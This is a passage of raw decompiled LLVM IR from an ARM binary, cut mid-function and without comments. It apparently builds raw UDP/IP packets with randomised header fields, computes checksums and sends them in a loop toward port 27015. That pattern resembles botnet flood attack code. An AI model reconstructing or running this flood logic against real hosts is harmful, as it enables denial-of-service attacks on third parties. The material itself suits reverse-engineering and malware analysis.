  store i32 %v4_9e60, i32* %v4_9e64, align 4
  br label %dec_label_pc_9e6c

dec_label_pc_9e6c:                                ; preds = %bb85, %.thread16
  store i32 %v1_9b34, i32* %r1.global-to-local, align 4
  store i1 %v2_9ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9ffc, label %dec_label_pc_9e78, label %dec_label_pc_a008

dec_label_pc_9e78:                                ; preds = %dec_label_pc_9e6c, %dec_label_pc_9ff4, %dec_label_pc_a008
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9e7c = load i32, i32* @r5, align 4
  %v3_9e7c = add i32 %v2_9e7c, 10
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 0, i16* %v4_9e7c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9e84 = load i32, i32* @r5, align 4
  store i32 %v0_9e84, i32* @r0, align 4
  %v2_9e88 = call i32 @function_c848(i32 %v0_9e84, i32 20)
  %v3_9e88 = trunc i32 %v2_9e88 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9e90 = load i32, i32* @r5, align 4
  %v4_9e90 = add i32 %v3_9e90, 10
  %v5_9e90 = inttoptr i32 %v4_9e90 to i16*
  store i16 %v3_9e88, i16* %v5_9e90, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i16
  %v2_9e98 = load i32, i32* @r6, align 4
  %v3_9e98 = add i32 %v2_9e98, 10
  %v4_9e98 = inttoptr i32 %v3_9e98 to i16*
  store i16 %v1_9e98, i16* %v4_9e98, align 2
  %v0_9e9c = load i32, i32* @r6, align 4
  store i32 %v0_9e9c, i32* @r0, align 4
  %v2_9ea0 = call i32 @function_c848(i32 %v0_9e9c, i32 20)
  %v3_9ea0 = trunc i32 %v2_9ea0 to i16
  %v3_9ea4 = load i32, i32* @r6, align 4
  %v4_9ea4 = add i32 %v3_9ea4, 10
  %v5_9ea4 = inttoptr i32 %v4_9ea4 to i16*
  store i16 %v3_9ea0, i16* %v5_9ea4, align 2
  store i32 0, i32* @r4, align 4
  %v0_9eac = load i32, i32* @r7, align 4
  store i32 %v0_9eac, i32* @r1, align 4
  %v1_9eb0 = add i32 %v0_9eac, 4
  %v2_9eb0 = inttoptr i32 %v1_9eb0 to i16*
  %v3_9eb0 = load i16, i16* %v2_9eb0, align 2
  %v4_9eb0 = zext i16 %v3_9eb0 to i32
  store i32 %v4_9eb0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_9eb8 = add i32 %v0_9eac, 6
  %v4_9eb8 = inttoptr i32 %v3_9eb8 to i16*
  store i16 0, i16* %v4_9eb8, align 2
  %v0_9ebc = load i32, i32* @r6, align 4
  %v4_9ec0 = call i32 @function_c898(i32 %v0_9ebc, i32 %v0_9eac, i32 %v4_9eb0, i32 %stack_var_-124.0.ph)
  %v5_9ec0 = trunc i32 %v4_9ec0 to i16
  %v3_9ec4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ec4, i32* %r2.global-to-local, align 4
  %v3_9ec8 = mul i32 %v3_9ec4, 32
  store i32 %v3_9ec8, i32* %r3.global-to-local, align 4
  %v0_9ecc = load i32, i32* @r5, align 4
  %v1_9ecc = add i32 %v0_9ecc, 16
  %v2_9ecc = inttoptr i32 %v1_9ecc to i32*
  %v3_9ecc = load i32, i32* %v2_9ecc, align 4
  %v5_9ed0 = mul i32 %v3_9ec4, 24
  store i32 %v5_9ed0, i32* %r3.global-to-local, align 4
  %v1_9ed4 = load i32, i32* @sb, align 4
  %v2_9ed4 = add i32 %v1_9ed4, %v5_9ed0
  store i32 %v2_9ed4, i32* @lr, align 4
  %v2_9ed8 = add i32 %v2_9ed4, 4
  %v3_9ed8 = inttoptr i32 %v2_9ed8 to i32*
  store i32 %v3_9ecc, i32* %v3_9ed8, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9ee0 = load i32, i32* @r7, align 4
  %v4_9ee0 = add i32 %v3_9ee0, 6
  %v5_9ee0 = inttoptr i32 %v4_9ee0 to i16*
  store i16 %v5_9ec0, i16* %v5_9ee0, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9ee8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v0_9ee8 to i16
  %v2_9ee8 = load i32, i32* %r3.global-to-local, align 4
  %v3_9ee8 = load i32, i32* @sb, align 4
  %v4_9ee8 = add i32 %v3_9ee8, %v2_9ee8
  %v5_9ee8 = inttoptr i32 %v4_9ee8 to i16*
  store i16 %v1_9ee8, i16* %v5_9ee8, align 2
  %v0_9eec = load i32, i32* @r4, align 4
  %v1_9eec = trunc i32 %v0_9eec to i16
  %v2_9eec = load i32, i32* @lr, align 4
  %v3_9eec = add i32 %v2_9eec, 2
  %v4_9eec = inttoptr i32 %v3_9eec to i16*
  store i16 %v1_9eec, i16* %v4_9eec, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9ef4 = load i32, i32* @r5, align 4
  store i32 %v0_9ef4, i32* %r1.global-to-local, align 4
  %v0_9efc = load i32, i32* @r8, align 4
  store i32 %v0_9efc, i32* %r2.global-to-local, align 4
  %v0_9f00 = load i32, i32* @lr, align 4
  %v0_9f04 = load i32, i32* %ip.global-to-local, align 4
  %v6_9f08 = call i32 @function_11a68(i32 %v3_9b7c, i32 %v0_9ef4, i32 %v0_9efc, i32 16384, i32 %v0_9f00, i32 %v0_9f04)
  %v3_9f0c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f0c, i32* %r3.global-to-local, align 4
  %v1_9f10 = add i32 %v3_9f0c, 1
  %v1_9f14 = load i32, i32* @sl, align 4
  %v9_9f14 = icmp eq i32 %v1_9f10, %v1_9f14
  store i1 %v9_9f14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9f10, i32* %stack_var_-44, align 4
  %v6_9f1c = icmp slt i32 %v1_9f10, %v1_9f14
  br i1 %v6_9f1c, label %dec_label_pc_9dfc, label %dec_label_pc_9de8

dec_label_pc_9f24:                                ; preds = %dec_label_pc_9dfc
  %v1_9f24 = add i32 %v2_9e04, 16
  %v2_9f24 = inttoptr i32 %v1_9f24 to i32*
  %v3_9f24 = load i32, i32* %v2_9f24, align 4
  store i32 %v3_9f24, i32* %r4.global-to-local, align 4
  %v0_9f28 = call i32 @function_e0d0()
  %v3_9f2c = load i32, i32* %stack_var_-44, align 4
  %v5_9f34 = mul i32 %v3_9f2c, 24
  %v0_9f38 = load i32, i32* %r4.global-to-local, align 4
  %v1_9f38 = and i32 %v0_9f38, 16711680
  store i32 %v1_9f38, i32* %ip.global-to-local, align 4
  %v3_9f3c = udiv i32 %v0_9f38, 16777216
  %v4_9f40 = udiv i32 %v1_9f38, 256
  %v5_9f40 = or i32 %v4_9f40, %v3_9f3c
  store i32 %v5_9f40, i32* %r2.global-to-local, align 4
  %v1_9f44 = load i32, i32* @sb, align 4
  %v2_9f44 = add i32 %v1_9f44, %v5_9f34
  store i32 %v2_9f44, i32* %r1.global-to-local, align 4
  %v1_9f48 = and i32 %v0_9f38, 65280
  store i32 %v1_9f48, i32* %r3.global-to-local, align 4
  %v1_9f4c = add i32 %v2_9f44, 20
  %v2_9f4c = inttoptr i32 %v1_9f4c to i8*
  %v3_9f4c = load i8, i8* %v2_9f4c, align 1
  %v4_9f4c = zext i8 %v3_9f4c to i32
  store i32 %v4_9f4c, i32* %ip.global-to-local, align 4
  %v5_9f54 = call i32 @llvm.bswap.i32(i32 %v0_9f38)
  %v7_9f58 = lshr i32 %v0_9f28, %v4_9f4c
  %v8_9f58 = add i32 %v7_9f58, %v5_9f54
  store i32 %v8_9f58, i32* %r2.global-to-local, align 4
  store i32 %v5_9b68, i32* %r1.global-to-local, align 4
  %v5_9f74 = call i32 @llvm.bswap.i32(i32 %v8_9f58)
  store i32 %v5_9f74, i32* %r3.global-to-local, align 4
  store i1 %v7_9e28, i1* %cpsr_z.global-to-local, align 1
  %v1_9f7c = load i32, i32* @r5, align 4
  %v2_9f7c = add i32 %v1_9f7c, 16
  %v3_9f7c = inttoptr i32 %v2_9f7c to i32*
  store i32 %v5_9f74, i32* %v3_9f7c, align 4
  br i1 %v2_9e28, label %dec_label_pc_9f84, label %dec_label_pc_9e30

dec_label_pc_9f84:                                ; preds = %dec_label_pc_9f24, %dec_label_pc_9e24
  %v0_9f84 = call i32 @function_e0d0()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9f90 = load i32, i32* @fp, align 4
  %v9_9f90 = icmp eq i32 %v0_9f90, 65535
  store i1 %v9_9f90, i1* %cpsr_z.global-to-local, align 1
  %v1_9f94 = load i32, i32* @r5, align 4
  %v2_9f94 = add i32 %v1_9f94, 12
  %v3_9f94 = inttoptr i32 %v2_9f94 to i32*
  store i32 %v0_9f84, i32* %v3_9f94, align 4
  br i1 %v9_9f90, label %dec_label_pc_9f9c, label %dec_label_pc_9f84.dec_label_pc_9e40_crit_edge

dec_label_pc_9f84.dec_label_pc_9e40_crit_edge:    ; preds = %dec_label_pc_9f84
  %v1_9e44.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e40

dec_label_pc_9f9c:                                ; preds = %dec_label_pc_9f84, %dec_label_pc_9e30
  %v0_9f9c = call i32 @function_e0d0()
  %v3_9fa4 = urem i32 %v0_9f9c, 65536
  store i32 %v3_9bc8, i32* %r2.global-to-local, align 4
  %v1_9fb0 = sub nsw i32 999, %v3_9fa4
  store i32 %v1_9fb0, i32* %r3.global-to-local, align 4
  %v1_9fb4 = load i32, i32* %r4.global-to-local, align 4
  %v9_9fb4 = icmp eq i32 %v3_9bc8, %v1_9fb4
  store i1 %v9_9fb4, i1* %cpsr_z.global-to-local, align 1
  %v1_9fb8 = trunc i32 %v0_9f9c to i16
  %v2_9fb8 = load i32, i32* @r5, align 4
  %v3_9fb8 = add i32 %v2_9fb8, 4
  %v4_9fb8 = inttoptr i32 %v3_9fb8 to i16*
  store i16 %v1_9fb8, i16* %v4_9fb8, align 2
  %v0_9fbc = load i32, i32* %r3.global-to-local, align 4
  %v1_9fbc = trunc i32 %v0_9fbc to i16
  %v2_9fbc = load i32, i32* @r6, align 4
  %v3_9fbc = add i32 %v2_9fbc, 4
  %v4_9fbc = inttoptr i32 %v3_9fbc to i16*
  store i16 %v1_9fbc, i16* %v4_9fbc, align 2
  br i1 %v9_9fb4, label %dec_label_pc_9fc4, label %dec_label_pc_9f9c.dec_label_pc_9e4c_crit_edge

dec_label_pc_9f9c.dec_label_pc_9e4c_crit_edge:    ; preds = %dec_label_pc_9f9c
  %v1_9e50.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e4c

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9f9c, %dec_label_pc_9e40
  %v0_9fc4 = call i32 @function_e0d0()
  %v1_9fc4 = trunc i32 %v0_9fc4 to i16
  store i32 %v3_9bcc, i32* %r3.global-to-local, align 4
  %v1_9fcc = load i32, i32* %r4.global-to-local, align 4
  %v9_9fcc = icmp eq i32 %v3_9bcc, %v1_9fcc
  store i1 %v9_9fcc, i1* %cpsr_z.global-to-local, align 1
  %v3_9fd0 = load i32, i32* @r5, align 4
  %v4_9fd0 = add i32 %v3_9fd0, 44
  %v5_9fd0 = inttoptr i32 %v4_9fd0 to i16*
  store i16 %v1_9fc4, i16* %v5_9fd0, align 2
  br i1 %v9_9fcc, label %dec_label_pc_9fd8, label %dec_label_pc_9e58

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e4c
  %v0_9fd8 = call i32 @function_e0d0()
  %v1_9fd8 = trunc i32 %v0_9fd8 to i16
  store i32 %v1_9bc0, i32* @r4, align 4
  store i1 %v2_9fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9fe0, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_9fd8
  %v3_9fe831 = load i32, i32* @r7, align 4
  %v4_9fe832 = add i32 %v3_9fe831, 2
  %v5_9fe833 = inttoptr i32 %v4_9fe832 to i16*
  store i16 %v1_9fd8, i16* %v5_9fe833, align 2
  br label %dec_label_pc_9ff4

bb85:                                             ; preds = %dec_label_pc_9fd8
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 16
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  %v4_9fe4 = load i32, i32* %v3_9fe4, align 4
  store i32 %v4_9fe4, i32* %r3.global-to-local, align 4
  %v3_9fe8 = load i32, i32* @r7, align 4
  %v4_9fe8 = add i32 %v3_9fe8, 2
  %v5_9fe8 = inttoptr i32 %v4_9fe8 to i16*
  store i16 %v1_9fd8, i16* %v5_9fe8, align 2
  %v1_9fec = load i32, i32* %r3.global-to-local, align 4
  %v2_9fec = load i32, i32* @r6, align 4
  %v3_9fec = add i32 %v2_9fec, 16
  %v4_9fec = inttoptr i32 %v3_9fec to i32*
  store i32 %v1_9fec, i32* %v4_9fec, align 4
  br label %dec_label_pc_9e6c

dec_label_pc_9ff4:                                ; preds = %.thread30, %dec_label_pc_9e58
  %v0_9ff4 = call i32 @function_e0d0()
  store i32 %v1_9b34, i32* %r1.global-to-local, align 4
  store i1 %v2_9ffc, i1* %cpsr_z.global-to-local, align 1
  %v1_a000 = load i32, i32* @r6, align 4
  %v2_a000 = add i32 %v1_a000, 16
  %v3_a000 = inttoptr i32 %v2_a000 to i32*
  store i32 %v0_9ff4, i32* %v3_a000, align 4
  br i1 %v2_9ffc, label %dec_label_pc_9e78, label %dec_label_pc_a008

dec_label_pc_a008:                                ; preds = %dec_label_pc_9e6c, %dec_label_pc_9ff4
  %v0_a008 = load i32, i32* @r7, align 4
  %v1_a008 = add i32 %v0_a008, 8
  store i32 %v5_9b14, i32* %r1.global-to-local, align 4
  %v2_a010 = inttoptr i32 %v1_a008 to i16*
  %v3_a010 = call i32 @function_e264(i16* %v2_a010, i32 %v5_9b14)
  br label %dec_label_pc_9e78

dec_label_pc_a018:                                ; preds = %dec_label_pc_9b8c
  %v1_a01c = call i32 @function_1130c(i32 %v3_9b7c)
  br label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9a2c, %dec_label_pc_a018
  %v1_a028 = phi i32 [ %v3_9b7c, %dec_label_pc_9a2c ], [ %v1_a01c, %dec_label_pc_a018 ]
  store i32 %v3_9a2c, i32* %r4.global-to-local, align 4
  store i32 %v6_9a2c, i32* %r5.global-to-local, align 4
  store i32 %v24_9a2c, i32* %fp.global-to-local, align 4
  ret i32 %v1_a028

dec_label_pc_a02c:                                ; preds = %dec_label_pc_9bb4
  store i32 %v5_9b14, i32* %r2.global-to-local, align 4
  %v1_a034 = add i32 %v5_9b14, 8
  store i32 %v1_a034, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9de8.preheader

; uselistorder directives
  uselistorder i32 %v1_a034, { 1, 0 }
  uselistorder i16 %v1_9fd8, { 1, 0 }
  uselistorder i32 %v0_9f9c, { 1, 0 }
  uselistorder i32 %v5_9f74, { 1, 0 }
  uselistorder i32 %v0_9f38, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9f14, { 1, 2, 0 }
  uselistorder i32 %v1_9f10, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9ec4, { 1, 0, 2 }
  uselistorder i32 %v0_9eac, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9e10, { 1, 0, 2 }
  uselistorder i1 %v7_9e28, { 2, 1, 0 }
  uselistorder i1 %v2_9ffc, { 2, 3, 1, 0 }
  uselistorder i1 %v2_9fe0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9d84, { 1, 0 }
  uselistorder i32 %v4_9cf813, { 1, 0 }
  uselistorder i32 %v3_9c1c, { 1, 0 }
  uselistorder i32 %v3_9c00, { 1, 2, 0 }
  uselistorder i32 %v1_9bfc, { 1, 0 }
  uselistorder i32 %v1_9bc0, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9bbc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9bb8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9bb4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9bac, { 1, 0 }
  uselistorder i1 %v7_9b80, { 1, 0 }
  uselistorder i32 %v3_9b7c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_9b68, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9b34, { 2, 1, 3, 0 }
  uselistorder i32 %v5_9b14, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_9ac8, { 1, 0 }
  uselistorder i32 %v1_9aa4, { 2, 1, 0 }
  uselistorder i32 %v5_9a9c, { 1, 0 }
  uselistorder i8 %v5_9a80, { 0, 2, 1 }
  uselistorder i32 %v6_9a60, { 1, 0 }
  uselistorder i32 %v2_9a48, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 26, 25, 27, 28, 30, 29, 31, 32, 34, 33, 36, 35, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a020, { 1, 0 }
  uselistorder label %dec_label_pc_a008, { 1, 0 }
  uselistorder label %dec_label_pc_9e78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9de8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9de8.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @function_a048(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a048:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_a048 = load i32, i32* @r4, align 4
  %v27_a048 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a064 = call i32 @function_12654(i32 %arg1, i32 4)
  %v0_a068 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a064, i32* @fp, align 4
  %v0_a078 = load i32, i32* @r4, align 4
  %v4_a07c = inttoptr i32 %v0_a068 to i32*
  %v5_a07c = call i32 @function_8570(i32 %v0_a078, i32* %v4_a07c, i32 2, i32 0)
  %v1_a088 = urem i32 %v5_a07c, 256
  store i32 %v1_a088, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a094 = load i32, i32* @r4, align 4
  %v0_a098 = load i32, i32* @r5, align 4
  %v5_a09c = trunc i32 %v5_a07c to i8
  %v6_a0a0 = inttoptr i32 %v0_a098 to i32*
  %v7_a0a0 = call i32 @function_8570(i32 %v0_a094, i32* %v6_a0a0, i32 3, i32 65535)
  %v0_a0a4 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0a0, i32* @r7, align 4
  %v0_a0b4 = load i32, i32* @r4, align 4
  %v4_a0b8 = inttoptr i32 %v0_a0a4 to i32*
  %v5_a0b8 = call i32 @function_8570(i32 %v0_a0b4, i32* %v4_a0b8, i32 4, i32 64)
  %v1_a0c0 = urem i32 %v5_a0b8, 256
  store i32 %v1_a0c0, i32* %ip.global-to-local, align 4
  %v0_a0c4 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0d0 = load i32, i32* @r4, align 4
  %v6_a0d8 = inttoptr i32 %v0_a0c4 to i32*
  %v7_a0d8 = call i32 @function_8570(i32 %v0_a0d0, i32* %v6_a0d8, i32 5, i32 0)
  %v1_a0e4 = urem i32 %v7_a0d8, 256
  store i32 %v1_a0e4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a0f0 = load i32, i32* @r4, align 4
  %v0_a0f4 = load i32, i32* @r5, align 4
  %v5_a0fc = inttoptr i32 %v0_a0f4 to i32*
  %v6_a0fc = call i32 @function_8570(i32 %v0_a0f0, i32* %v5_a0fc, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  store i32 %v6_a0fc, i32* @r6, align 4
  %v0_a114 = load i32, i32* @r4, align 4
  %v4_a118 = inttoptr i32 %v0_a10c to i32*
  %v5_a118 = call i32 @function_8570(i32 %v0_a114, i32* %v4_a118, i32 7, i32 27015)
  store i32 %v5_a118, i32* @r4, align 4
  %v1_a124 = call i32 @function_1030c(i32 20)
  %v3_a130 = call i32 @function_10248(i32 20, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_a144 = call i32 @function_11aec(i32 2, i32 3, i32 17)
  %v7_a148 = icmp eq i32 %v3_a144, -1
  store i1 %v7_a148, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a144, i32* @sb, align 4
  br i1 %v7_a148, label %dec_label_pc_a470, label %dec_label_pc_a154

dec_label_pc_a154:                                ; preds = %dec_label_pc_a048
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a15c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a15c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a170 = call i32 @function_11aa8(i32 %v3_a144, i32 0, i32 3, i32 %v6_a15c, i32 ptrtoint (i32* @0 to i32))
  %v7_a174 = icmp eq i32 %v5_a170, -1
  store i1 %v7_a174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a174, label %dec_label_pc_a468, label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %dec_label_pc_a154
  %v0_a17c = load i32, i32* @r4, align 4
  %v3_a17c = mul i32 %v0_a17c, 65536
  store i32 %v3_a17c, i32* @lr, align 4
  %v0_a180 = load i32, i32* @r7, align 4
  %v0_a184 = load i32, i32* @r6, align 4
  %v3_a184 = mul i32 %v0_a184, 65536
  store i32 %v3_a184, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_a18c = urem i32 %v0_a180, 65536
  %v3_a190 = urem i32 %v0_a184, 65536
  store i32 %v3_a190, i32* %r2.global-to-local, align 4
  %v3_a194 = urem i32 %v0_a17c, 65536
  store i32 %v3_a194, i32* %r3.global-to-local, align 4
  %v0_a198 = load i32, i32* @r8, align 4
  %v2_a198 = icmp eq i32 %v0_a198, 0
  store i1 %v2_a198, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a198, label %dec_label_pc_a2d4.preheader, label %dec_label_pc_a1b0

dec_label_pc_a1b0:                                ; preds = %dec_label_pc_a17c
  %tmp34 = mul i32 %v0_a180, 256
  %v3_a1c0 = and i32 %tmp34, 65280
  store i32 %v3_a1c0, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_a184, 256
  %v3_a1c4 = and i32 %tmp35, 65280
  store i32 %v3_a1c4, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_a17c, 256
  %v3_a1c8 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_a180, 256
  %v4_a1cc = urem i32 %tmp37, 256
  %v5_a1cc = or i32 %v4_a1cc, %v3_a1c0
  store i32 %v5_a1cc, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_a184, 256
  %v4_a1d0 = urem i32 %tmp38, 256
  %v5_a1d0 = or i32 %v4_a1d0, %v3_a1c4
  store i32 %v5_a1d0, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_a17c, 256
  %v4_a1d4 = urem i32 %tmp39, 256
  %v5_a1d4 = or i32 %v4_a1d4, %v3_a1c8
  store i32 %v5_a1d4, i32* @r7, align 4
  %v1_a25c = trunc i32 %v5_a0b8 to i8
  br label %dec_label_pc_a1d8

dec_label_pc_a1d8:                                ; preds = %.thread, %dec_label_pc_a1b0
  %v2_a1e0 = call i32 @function_12654(i32 128, i32 1)
  %v3_a1e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a1e4, i32* %r2.global-to-local, align 4
  %v5_a1ec = mul i32 %v3_a1e4, 24
  store i32 %v5_a1ec, i32* %r3.global-to-local, align 4
  %v1_a1f0 = load i32, i32* @fp, align 4
  %v2_a1f0 = load i32, i32* @r4, align 4
  %v5_a1f0 = mul i32 %v2_a1f0, 4
  %v6_a1f0 = add i32 %v5_a1f0, %v1_a1f0
  %v7_a1f0 = inttoptr i32 %v6_a1f0 to i32*
  store i32 %v2_a1e0, i32* %v7_a1f0, align 4
  %v0_a1f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a1f4 = load i32, i32* @sl, align 4
  %v2_a1f4 = add i32 %v1_a1f4, %v0_a1f4
  store i32 %v2_a1f4, i32* %r3.global-to-local, align 4
  %v0_a1f8 = load i32, i32* @fp, align 4
  %v1_a1f8 = load i32, i32* %r2.global-to-local, align 4
  %v4_a1f8 = mul i32 %v1_a1f8, 4
  %v5_a1f8 = add i32 %v4_a1f8, %v0_a1f8
  %v6_a1f8 = inttoptr i32 %v5_a1f8 to i32*
  %v7_a1f8 = load i32, i32* %v6_a1f8, align 4
  store i32 %v7_a1f8, i32* @lr, align 4
  %v1_a200 = inttoptr i32 %v7_a1f8 to i8*
  %v2_a200 = load i8, i8* %v1_a200, align 1
  %tmp = urem i8 %v2_a200, 16
  %v1_a204 = zext i8 %tmp to i32
  %v1_a208 = or i32 %v1_a204, 64
  store i32 %v1_a208, i32* %r3.global-to-local, align 4
  %v1_a210 = trunc i32 %v1_a208 to i8
  store i8 %v1_a210, i8* %v1_a200, align 1
  %v0_a214 = load i32, i32* @lr, align 4
  %v1_a214 = inttoptr i32 %v0_a214 to i8*
  %v2_a214 = load i8, i8* %v1_a214, align 1
  %v1_a218 = and i8 %v2_a214, -16
  %v1_a21c = or i8 %v1_a218, 5
  store i8 %v1_a21c, i8* %v1_a214, align 1
  %v2_a228 = load i32, i32* @lr, align 4
  %v3_a228 = add i32 %v2_a228, 1
  %v4_a228 = inttoptr i32 %v3_a228 to i8*
  store i8 %v5_a09c, i8* %v4_a228, align 1
  %v3_a22c = load i32, i32* %stack_var_-48, align 4
  %v3_a230 = mul i32 %v3_a22c, 65536
  %v1_a234 = add i32 %v3_a230, 2097152
  %v3_a238 = udiv i32 %v1_a234, 256
  %v4_a240 = udiv i32 %v1_a234, 16777216
  %v5_a240 = or i32 %v3_a238, %v4_a240
  %v3_a244 = urem i32 %v3_a22c, 65536
  store i32 %v3_a244, i32* %r2.global-to-local, align 4
  %v1_a248 = trunc i32 %v5_a240 to i16
  %v2_a248 = load i32, i32* @lr, align 4
  %v3_a248 = add i32 %v2_a248, 2
  %v4_a248 = inttoptr i32 %v3_a248 to i16*
  store i16 %v1_a248, i16* %v4_a248, align 2
  %v0_a24c = load i32, i32* %r2.global-to-local, align 4
  %v1_a24c = mul i32 %v0_a24c, 65536
  %v3_a254 = add i32 %v1_a24c, 786432
  store i32 %v3_a254, i32* %r2.global-to-local, align 4
  store i32 %v1_a0e4, i32* %ip.global-to-local, align 4
  %v2_a25c = load i32, i32* @lr, align 4
  %v3_a25c = add i32 %v2_a25c, 8
  %v4_a25c = inttoptr i32 %v3_a25c to i8*
  store i8 %v1_a25c, i8* %v4_a25c, align 1
  %v0_a260 = load i32, i32* %r2.global-to-local, align 4
  %v3_a260 = udiv i32 %v0_a260, 256
  %v1_a264 = and i32 %v3_a260, 65280
  %v0_a268 = load i32, i32* %ip.global-to-local, align 4
  %v2_a268 = icmp eq i32 %v0_a268, 0
  store i1 %v2_a268, i1* %cpsr_z.global-to-local, align 1
  %v4_a26c = udiv i32 %v0_a260, 16777216
